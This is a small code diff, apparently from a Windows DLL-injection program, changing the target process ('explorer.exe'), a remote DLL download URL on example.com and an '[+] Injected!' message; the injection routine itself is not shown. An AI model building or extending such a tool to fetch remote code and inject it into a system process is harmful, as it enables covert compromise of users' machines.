@@ -1,7 +1,7 @@
 #include "injection.h"
 
-const char szProc[] = "explorer.exe";
-const char DllURL[] = "http://example.com/library.dll";
+const char* szProc = "explorer.exe";
+const char* DllURL = "https://example.com/library.dll";
 
 int main() {
 	PROCESSENTRY32 PE32{ 0 };
@@ -42,7 +42,7 @@ int main() {
 
 	CloseHandle(hProc);
 
-	printf("[+] Injected!\n");
+	printf("\n[+] Injected!\n");
 	system("PAUSE");
 
 	return 0;
